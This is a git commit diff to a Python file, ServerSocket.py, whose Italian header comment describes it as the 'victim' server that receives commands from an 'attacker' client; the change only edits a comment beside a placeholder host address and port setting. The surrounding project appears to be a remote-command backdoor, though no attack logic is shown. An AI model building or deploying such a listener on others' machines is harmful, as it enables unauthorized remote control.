ec3ea6fb96a38f5cf3b65d368a406b7349871f89
Gomez16 <kizaru774@gmail.com>
2017-08-01 01:45:12 +0200

    Update ServerSocket.py

--- ServerSocket.py
+++ ServerSocket.py
@@ -11,7 +11,7 @@ import shlex
 
 ###### SERVER (VITTIMA) CHE RICEVE I COMANDI DAL CLIENT (ATTACCANTE) ######
 
-HOST = '192.168.1.xxx'  # localhost (dare ifconfig da terminale ubuntu altrimenti ipconfig su prompt windows)
+HOST = '192.168.1.xxx'  # dare ifconfig da terminale ubuntu altrimenti ipconfig su prompt windows
 PORT = 8888  # Porta da usare
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
